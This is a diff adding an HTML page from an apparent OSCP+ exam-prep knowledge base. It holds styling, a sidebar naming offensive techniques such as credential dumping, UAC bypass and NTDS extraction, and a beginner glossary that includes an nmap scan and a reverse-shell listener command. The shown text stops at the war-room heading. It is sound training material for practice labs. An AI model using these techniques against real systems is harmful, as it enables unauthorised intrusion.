@@ -1,0 +1,907 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Exam War Room · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">⭐ Exam War Room</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v0-[how-to-read-this]-completely-new-read-this-first-5-minutes">[HOW-TO-READ-THIS]  👋 completely new? Read this first (5 minutes)</a><a class="navlink lvl2" href="#v0-the-tags-in-[square-brackets]">The tags in [SQUARE BRACKETS]</a><a class="navlink lvl1" href="#v0-[exam-war-room]-the-day-of-single-reference">[EXAM-WAR-ROOM]  🎯 the day-of single reference</a><a class="navlink lvl2" href="#v0-05-[exam-rules-2026]-dont-get-points-voided-verify-on-the-current-official-guide">0.5) [EXAM-RULES-2026] ⛔ don&#x27;t get points VOIDED (verify on the current official guide)</a><a class="navlink lvl2" href="#v0-[pre-exam-setup]-copy-paste-this-one-block-run-top-to-bottom">[PRE-EXAM-SETUP]  📋 copy-paste this (one block, run top-to-bottom)</a><a class="navlink lvl2" href="#v0-1-pre-flight-day-before-first-10-min-[exam-day-flow]-phase-0">1) PRE-FLIGHT (day before + first 10 min)  → [EXAM-DAY-FLOW] Phase 0</a><a class="navlink lvl2" href="#v0-2-launch-all-scans-in-parallel-first-2030-min-[nmap-quick]">2) LAUNCH ALL SCANS IN PARALLEL (first 20–30 min)  → [NMAP-QUICK]</a><a class="navlink lvl2" href="#v0-25-[exam-order-debate]-which-target-first-two-valid-schools-pick-yours">2.5) [EXAM-ORDER-DEBATE] which target first? (two valid schools — pick yours)</a><a class="navlink lvl2" href="#v0-5-always-try-quick-wins-the-point-grabbers-[chain-]-[found-]">5) ALWAYS-TRY QUICK WINS (the point-grabbers)  → [CHAIN-*], [FOUND-*]</a><a class="navlink lvl2" href="#v0-6-stuck-1530-rule-[stuck-protocol]">6) STUCK? (15/30 rule)  → [STUCK-PROTOCOL]</a><a class="navlink lvl2" href="#v0-7-proof-capture-do-not-lose-points-here-[reporting-checklist]">7) PROOF CAPTURE (do NOT lose points here)  → [REPORTING-CHECKLIST]</a><a class="navlink lvl1" href="#v0-[cve-hits]-common-oscp-vulnerable-software-exploit-map">[CVE-HITS]  common OSCP vulnerable-software → exploit map</a><a class="navlink lvl1" href="#v0-[community-addendum]-extra-field-tested-commands-synthesized-from-public-oscp-notes">[COMMUNITY-ADDENDUM]  extra field-tested commands (synthesized from public OSCP notes)</a><a class="navlink lvl2" href="#v0-[addendum-enum]">[ADDENDUM-ENUM]</a><a class="navlink lvl2" href="#v0-[addendum-web-cms]">[ADDENDUM-WEB-CMS]</a><a class="navlink lvl2" href="#v0-[addendum-ad-powerview]-windows-side-enum-when-you-have-a-windows-shell">[ADDENDUM-AD-POWERVIEW]  (Windows-side enum, when you have a Windows shell)</a><a class="navlink lvl2" href="#v0-[addendum-ad-tickets]-recognize-mostly-post-da-or-specific">[ADDENDUM-AD-TICKETS]  (recognize; mostly post-DA or specific)</a><a class="navlink lvl2" href="#v0-[addendum-lateral]">[ADDENDUM-LATERAL]</a><a class="navlink lvl2" href="#v0-[addendum-pivot]">[ADDENDUM-PIVOT]</a><a class="navlink lvl2" href="#v0-[addendum-crack]">[ADDENDUM-CRACK]</a><a class="navlink lvl2" href="#v0-[addendum-misc]">[ADDENDUM-MISC]</a><a class="navlink lvl1" href="#v0-[exam-scripts]-exam-safe-automation-source-once-tiny-commands">[EXAM-SCRIPTS]  🤖 exam-safe automation (source once → tiny commands)</a><a class="navlink lvl2" href="#v0-[exam-scripts-setup]-save-this-as-oscpsh-then-source-oscpsh-once-at-exam-start">[EXAM-SCRIPTS-SETUP]  save this as ~/oscp.sh, then source ~/oscp.sh once at exam start</a><a class="navlink lvl2" href="#v0-[exam-scripts-use]-the-whole-exam-in-tiny-commands">[EXAM-SCRIPTS-USE]  the whole exam, in tiny commands</a><a class="navlink lvl2" href="#v0-[exam-scripts-filemap]-where-everything-lives-on-your-kali">[EXAM-SCRIPTS-FILEMAP]  where everything lives (on your Kali)</a><a class="navlink lvl2" href="#v0-[exam-scripts-community]-ready-made-enum-tools-allowed-background-them">[EXAM-SCRIPTS-COMMUNITY]  ready-made enum tools (allowed — background them)</a><a class="navlink lvl1" href="#v0-[addendum-parity]-extra-tools-from-popular-public-cheatsheets-parity-pass">[ADDENDUM-PARITY]  extra tools from popular public cheatsheets (parity pass)</a><a class="navlink lvl2" href="#v0-[parity-enum]-alternative-enumerators">[PARITY-ENUM]  alternative enumerators</a><a class="navlink lvl2" href="#v0-[parity-win-enum]-alternative-windows-privesc-enumerators-pick-one-if-winpeas-is-blocked">[PARITY-WIN-ENUM]  alternative Windows privesc enumerators (pick one if winPEAS is blocked)</a><a class="navlink lvl2" href="#v0-[parity-lin-enum]-alternative-linux-privesc-enumerators-if-linpeas-unavailable">[PARITY-LIN-ENUM]  alternative Linux privesc enumerators (if linpeas unavailable)</a><a class="navlink lvl2" href="#v0-[parity-potato]-seimpersonate-system-full-variant-list-try-in-this-order">[PARITY-POTATO]  SeImpersonate → SYSTEM, full variant list (try in this order)</a><a class="navlink lvl2" href="#v0-[parity-ad-rubeus]-rubeus-windows-side-kerberos-alt-to-impacket-when-you-have-a-windows-shell">[PARITY-AD-RUBEUS]  Rubeus (Windows-side Kerberos — alt to impacket when you have a Windows shell)</a><a class="navlink lvl2" href="#v0-[parity-ntds]-extract-ntdsdit-on-a-dc-sebackup-local-admin-on-dc-all-domain-hashes">[PARITY-NTDS]  extract NTDS.dit on a DC (SeBackup / local admin on DC) → all domain hashes</a><a class="navlink lvl2" href="#v0-[parity-pth-extra]-pass-the-hash-tool-variants">[PARITY-PTH-EXTRA]  pass-the-hash tool variants</a><a class="navlink lvl2" href="#v0-[parity-ad-report]-ad-reporting-optional-deeper-analysis">[PARITY-AD-REPORT]  AD reporting (optional, deeper analysis)</a><a class="navlink lvl1" href="#v0-[addendum-parity-2]-broader-sweep-0xsyr0oscp-ad-cheatsheets">[ADDENDUM-PARITY-2]  broader sweep (0xsyr0/OSCP + AD cheatsheets)</a><a class="navlink lvl2" href="#v0-[ad-adcs]-active-directory-certificate-services-abuse-certipy-increasingly-oscp-relevant">[AD-ADCS]  Active Directory Certificate Services abuse (Certipy) — increasingly OSCP-relevant</a><a class="navlink lvl2" href="#v0-[parity2-cred-dump]-credential-dumping-the-full-toolbox">[PARITY2-CRED-DUMP]  credential dumping — the full toolbox</a><a class="navlink lvl2" href="#v0-[parity2-coerce]-auth-coercion-relay-for-delegationadcs-paths">[PARITY2-COERCE]  auth coercion + relay (for delegation/ADCS paths)</a><a class="navlink lvl2" href="#v0-[parity2-dnsadmins]-dnsadmins-group-system-on-the-dc">[PARITY2-DNSADMINS]  DNSAdmins group → SYSTEM on the DC</a><a class="navlink lvl2" href="#v0-[parity2-mssql]-mssql-deeper-powerupsql-linked-servers">[PARITY2-MSSQL]  MSSQL deeper (PowerUpSQL + linked servers)</a><a class="navlink lvl2" href="#v0-[parity2-shells-pivot]-windows-side-transferpivot-extras">[PARITY2-SHELLS-PIVOT]  Windows-side transfer/pivot extras</a><a class="navlink lvl2" href="#v0-[parity2-web-extra]">[PARITY2-WEB-EXTRA]</a><a class="navlink lvl2" href="#v0-[parity2-wordlist-brute]">[PARITY2-WORDLIST-BRUTE]</a><a class="navlink lvl2" href="#v0-[parity2-enum-extra]">[PARITY2-ENUM-EXTRA]</a><a class="navlink lvl1" href="#v0-[gap-fill-final]-self-audit-gap-fills-things-every-oscp-toolkit-should-have">[GAP-FILL-FINAL]  self-audit gap fills (things every OSCP toolkit should have)</a><a class="navlink lvl2" href="#v0-[ad-doublehop]-the-double-hop-problem-bites-everyone-in-ad">[AD-DOUBLEHOP]  the &quot;double hop&quot; problem (bites everyone in AD)</a><a class="navlink lvl2" href="#v0-[ad-laps-gmsa]-read-managed-passwords-when-you-have-the-rights">[AD-LAPS-GMSA]  read managed passwords (when you have the rights)</a><a class="navlink lvl2" href="#v0-[win-uac-bypass]-medium-integrity-admin-high-integrity-bypass-uac">[WIN-UAC-BYPASS]  medium-integrity admin → high-integrity (bypass UAC)</a><a class="navlink lvl2" href="#v0-[win-priv-groups]-privileged-groups-systemdc-besides-domainenterprise-admins">[WIN-PRIV-GROUPS]  privileged groups → SYSTEM/DC (besides Domain/Enterprise Admins)</a><a class="navlink lvl2" href="#v0-[linux-ld-library]-ld-library-path-shared-lib-hijack-via-sudo">[LINUX-LD-LIBRARY]  LD_LIBRARY_PATH / shared-lib hijack via sudo</a><a class="navlink lvl2" href="#v0-[web-403-bypass]-a-path-returns-403401-try-to-get-in">[WEB-403-BYPASS]  a path returns 403/401 — try to get in</a><a class="navlink lvl2" href="#v0-[web-put-webdav]-writable-http-put-webdav-upload-a-shell">[WEB-PUT-WEBDAV]  writable HTTP PUT / WebDAV → upload a shell</a><a class="navlink lvl2" href="#v0-[web-param-mining]">[WEB-PARAM-MINING]</a><a class="navlink lvl2" href="#v0-[enum-misc-ports]-less-common-services-worth-a-look">[ENUM-MISC-PORTS]  less-common services worth a look</a><a class="navlink lvl2" href="#v0-[shell-revshells]-generator-bookmark">[SHELL-REVSHELLS]  generator bookmark</a><a class="navlink lvl1" href="#v0-[addendum-parity-3]-deep-mine-additions-0xsyr0oscp-sweep">[ADDENDUM-PARITY-3]  deep-mine additions (0xsyr0/OSCP sweep)</a><a class="navlink lvl2" href="#v0-[parity3-install]-installsetup-commands-that-were-missing">[PARITY3-INSTALL]  install/setup commands that were missing</a><a class="navlink lvl2" href="#v0-[parity3-sudoedit]-cve-2023-22809-sudoedit-arbitrary-file-write-root">[PARITY3-SUDOEDIT]  CVE-2023-22809 — sudoedit arbitrary file write → root</a><a class="navlink lvl2" href="#v0-[parity3-lfi-filterchain]-lfi-rce-with-no-writable-log-php-filter-chain">[PARITY3-LFI-FILTERCHAIN]  LFI → RCE with NO writable log (php filter chain)</a><a class="navlink lvl2" href="#v0-[parity3-ffuf]-ffuf-flags-worth-knowing">[PARITY3-FFUF]  ffuf flags worth knowing</a><a class="navlink lvl2" href="#v0-[parity3-kerberos]-ticket-workflow-mostly-in-[kerberos-quick]-completing-it">[PARITY3-KERBEROS]  ticket workflow (mostly in [KERBEROS-QUICK], completing it)</a><a class="navlink lvl2" href="#v0-[parity3-misc]-small-but-useful">[PARITY3-MISC]  small but useful</a><a class="navlink lvl1" href="#v0-[addendum-parity-4]-more-from-a-pen-200-aligned-cheatsheet-final-parity">[ADDENDUM-PARITY-4]  more from a PEN-200-aligned cheatsheet (final parity)</a><a class="navlink lvl2" href="#v0-[parity4-transfer]-upload-server-target-your-kali">[PARITY4-TRANSFER]  upload server (target → your Kali)</a><a class="navlink lvl2" href="#v0-[parity4-sigmapotato]-sigmapotato-newest-potato-try-when-godpotatoprintspoofer-fail">[PARITY4-SIGMAPOTATO]  SigmaPotato (newest Potato — try when GodPotato/PrintSpoofer fail)</a><a class="navlink lvl2" href="#v0-[parity4-ligolo]-ligolo-ng-current-syntax-newer-than-ip-tuntap">[PARITY4-LIGOLO]  Ligolo-ng current syntax (newer than ip tuntap)</a><a class="navlink lvl2" href="#v0-[parity4-winloot]-windows-credhive-dump-extras">[PARITY4-WINLOOT]  Windows cred/hive dump extras</a><a class="navlink lvl2" href="#v0-[parity4-enable-rdp]-turn-on-rdp-after-youre-admin-for-a-gui-stable-access">[PARITY4-ENABLE-RDP]  turn on RDP after you&#x27;re admin (for a GUI / stable access)</a><a class="navlink lvl2" href="#v0-[parity4-ad-extra]-powerview-trust-enumeration-extras">[PARITY4-AD-EXTRA]  PowerView + trust enumeration extras</a><a class="navlink lvl2" href="#v0-[parity4-credsniff]-linux-catch-credscron-in-real-time-on-a-shell">[PARITY4-CREDSNIFF]  Linux: catch creds/cron in real time (on a shell)</a><a class="navlink lvl2" href="#v0-[parity4-misc]">[PARITY4-MISC]</a><a class="navlink lvl1" href="#v0-[addendum-parity-5]-8-challenge-lab-sweep-secura-medtech-oscp-abc-zeus-poseidon-laser">[ADDENDUM-PARITY-5]  8-challenge-lab sweep (Secura, Medtech, OSCP-A/B/C, Zeus, Poseidon, Laser)</a><a class="navlink lvl2" href="#v0-[web-text4shell]-cve-2022-42889-text4shell-apache-commons-text-1519">[WEB-TEXT4SHELL]  CVE-2022-42889 (Text4Shell — Apache Commons Text 1.5–1.9)</a><a class="navlink lvl2" href="#v0-[enum-jdwp]-java-debug-wire-protocol-exposed-debug-port-often-80008787high">[ENUM-JDWP]  Java Debug Wire Protocol (exposed debug port — often 8000/8787/high)</a><a class="navlink lvl2" href="#v0-[windows-creds-putty]-stored-session-creds-winpeas-finds-these">[WINDOWS-CREDS-PUTTY]  stored session creds (winPEAS finds these)</a><a class="navlink lvl2" href="#v0-[smb-slinky]-nxc-slinky-auto-drop-a-malicious-lnk-in-a-writable-share-capture-ntlm">[SMB-SLINKY]  nxc slinky — auto-drop a malicious .lnk in a writable share → capture NTLM</a><a class="navlink lvl2" href="#v0-[pcap-analysis]-you-found-a-pcappcapng-mine-it-for-creds">[PCAP-ANALYSIS]  you found a .pcap/.pcapng → mine it for creds</a><a class="navlink lvl2" href="#v0-[ad-trust]-child-parent-forest-trust-escalation-poseidon-style">[AD-TRUST]  child → parent forest-trust escalation (Poseidon-style)</a><a class="navlink lvl1" href="#v0-[bof-deprecated]-buffer-overflow-not-on-the-current-oscp-exam">[BOF-DEPRECATED]  Buffer Overflow — ⚠️ NOT on the current OSCP+ exam</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v0-oscp-knowledge-base-volume-8">OSCP+ KNOWLEDGE BASE — VOLUME 8</div>
+<h2 id="v0--exam-war-room-single-pane-of-glass-common-cve-hits-community-addendum">⭐ EXAM WAR ROOM (single pane of glass) + COMMON CVE HITS + COMMUNITY ADDENDUM<a class="anchor" href="#v0--exam-war-room-single-pane-of-glass-common-cve-hits-community-addendum">#</a></h2>
+<blockquote>Open this ONE page on exam day. It ties every volume together into a scoring machine. <code>$IP</code>=your Kali tun0 IP · <code>$T</code>=target · <code>$DC</code>=domain controller · <code>$DOMAIN</code>=domain FQDN. Synthesized from official OffSec rules + widely-used community notes (see <code class="tag">[SOURCES]</code> in Vol 6). Verify tool/flag syntax against your installed versions — don&#x27;t run blind.</blockquote>
+<hr>
+<h1 id="v0-[how-to-read-this]-completely-new-read-this-first-5-minutes">[HOW-TO-READ-THIS]  👋 completely new? Read this first (5 minutes)<a class="anchor" href="#v0-[how-to-read-this]-completely-new-read-this-first-5-minutes">#</a></h1>
+<p>This knowledge base is a <strong>field manual for hacking practice machines</strong>, not a textbook. Here&#x27;s everything you need to use it.</p>
+<h2 id="v0-what-the-whole-process-looks-like-the-big-picture">What the whole process looks like (the big picture)<a class="anchor" href="#v0-what-the-whole-process-looks-like-the-big-picture">#</a></h2>
+<p>Every machine, start to finish, is the same five steps:</p>
+<pre><code>1. SCAN      →  find which &quot;doors&quot; (ports/services) are open        (Volume 1)
+2. ENUMERATE →  look closely at each service for a weakness         (Volumes 1–2)
+3. EXPLOIT   →  use that weakness to get a &quot;shell&quot; (command access) (Volume 3)
+4. ESCALATE  →  go from a normal user to root/SYSTEM (full control) (Volume 4)
+5. (if it&#x27;s a domain) spread to other machines → own the DC         (Volume 5)
+Along the way: read the flags (local.txt, then proof.txt) to prove you did it.</code></pre>
+<h2 id="v0-the-words-youll-see-everywhere-plain-english-glossary">The words you&#x27;ll see everywhere (plain-English glossary)<a class="anchor" href="#v0-the-words-youll-see-everywhere-plain-english-glossary">#</a></h2>
+<ul>
+<li><strong>Kali</strong> = your attacking Linux computer. <strong>Target / victim / box</strong> = the machine you&#x27;re hacking.</li>
+<li><strong>Shell</strong> = a command prompt on the target that you control. Getting one = your first big win (&quot;foothold&quot;).</li>
+<li><strong>Reverse shell</strong> = the target connects back to you; you catch it with a <strong>listener</strong> (<code>nc -lvnp 443</code>).</li>
+<li><strong>root</strong> = the all-powerful user on Linux. <strong>SYSTEM</strong> = the all-powerful user on Windows. Getting there = &quot;privilege escalation&quot; / &quot;privesc&quot;.</li>
+<li><strong>Enumerate</strong> = look around and gather information (the boring step that wins boxes).</li>
+<li><strong>Creds</strong> = credentials = a username + password (or a key, or a hash).</li>
+<li><strong>Hash</strong> = a password stored scrambled; you &quot;crack&quot; it by guessing (Volume 3).</li>
+<li><strong>Spray</strong> = try one password against many usernames. <strong>Pass-the-Hash</strong> = log in with a hash instead of the password.</li>
+<li><strong>AD (Active Directory)</strong> = a Windows company network run by a central <strong>Domain Controller (DC)</strong>. Own the DC = own everything (Volume 5).</li>
+<li><strong>Pivot</strong> = tunnel through one hacked machine to reach a hidden network behind it (Volume 5).</li>
+<li><strong>Flag</strong> = a text file (<code>local.txt</code>, <code>proof.txt</code>) that proves your access; reading it = points.</li>
+<li>More terms are in the full glossary: search <code class="tag">[GLOSSARY]</code> (Volume 9).</li>
+</ul>
+<h2 id="v0-how-to-read-a-command-in-this-kb">How to read a command in this KB<a class="anchor" href="#v0-how-to-read-a-command-in-this-kb">#</a></h2>
+<p>Commands look like this, with a <code>#</code> explanation after most lines:</p>
+<pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP   # scan all ports on the target</code></pre>
+<p><strong>Placeholders you MUST replace with real values before running:</strong></p>
+<div class="tablewrap"><table><thead><tr><th>You see</th><th>It means</th><th>Example</th></tr></thead><tbody>
+<tr><td><code>$IP</code> or <code>$T</code></td><td>the <strong>target&#x27;s</strong> IP</td><td><code>10.10.10.5</code></td></tr>
+<tr><td><code>&lt;IP&gt;</code>, <code>&lt;yourKaliIP&gt;</code>, <code>LHOST</code></td><td><strong>your Kali&#x27;s</strong> IP (run <code>ip addr show tun0</code>)</td><td><code>192.168.49.52</code></td></tr>
+<tr><td><code>$U</code> / <code>$P</code></td><td>a username / password you found</td><td><code>bob</code> / <code>Summer2025!</code></td></tr>
+<tr><td><code>$DC</code>, <code>$DOMAIN</code></td><td>the Domain Controller&#x27;s IP / the domain name</td><td><code>10.10.10.10</code> / <code>corp.local</code></td></tr>
+<tr><td><code>&lt;anything&gt;</code></td><td>&quot;put your own value here&quot;</td><td>—</td></tr>
+</tbody></table></div>
+<p><strong>Do this once when you start a box</strong> so the <code>$IP</code> in every command works:</p>
+<pre><code>export IP=10.10.10.5      # set the target IP (change to yours)
+mkdir -p scans            # make the folder that scan commands save into</code></pre>
+<h2 id="v0-the-tags-in-[square-brackets]">The tags in [SQUARE BRACKETS]<a class="anchor" href="#v0-the-tags-in-[square-brackets]">#</a></h2>
+<p>A tag like <code class="tag">[ENUM-SMB]</code> is a <strong>bookmark</strong>. When a line says &quot;→ <code class="tag">[SHELL-QUICK]</code>&quot; it means &quot;go read that section next&quot;. To jump: press <strong>Ctrl+F</strong>, type the tag, hit Enter. Difficulty labels:</p>
+<ul>
+<li>**<code class="tag">[MUST-MEMORIZE]</code><strong> = learn it by heart. </strong><code class="tag">[MUST-RECOGNIZE]</code><strong> = just know what it does. </strong><code class="tag">[LOOK-UP]</code>** = niche; look it up when you need it.</li>
+</ul>
+<h2 id="v0-the-3-rules-that-matter-most">The 3 rules that matter most<a class="anchor" href="#v0-the-3-rules-that-matter-most">#</a></h2>
+<ol>
+<li><strong>Enumerate everything before attacking anything.</strong> Rushing the first port is why beginners fail.</li>
+<li><strong>Every credential you find → try it EVERYWHERE</strong> (every service, every user). Password reuse wins boxes.</li>
+<li><strong>When stuck, go back and enumerate more.</strong> The answer is almost always something you haven&#x27;t looked at yet — not a cleverer exploit.</li>
+</ol>
+<h2 id="v0-where-to-go-now">Where to go now<a class="anchor" href="#v0-where-to-go-now">#</a></h2>
+<ul>
+<li>Brand new to the tools/Kali? → Volume 9 (<code class="tag">[KALI-SETUP]</code>, <code class="tag">[GLOSSARY]</code>, first-box walkthroughs).</li>
+<li>Ready to attack a box? → start at Volume 1 (<code class="tag">[NMAP-QUICK]</code>) and follow the &quot;→&quot; links.</li>
+<li>On exam day? → the rest of THIS page (the War Room) is your minute-by-minute plan.</li>
+</ul>
+<hr>
+<h1 id="v0-[exam-war-room]-the-day-of-single-reference">[EXAM-WAR-ROOM]  🎯 the day-of single reference<a class="anchor" href="#v0-[exam-war-room]-the-day-of-single-reference">#</a></h1>
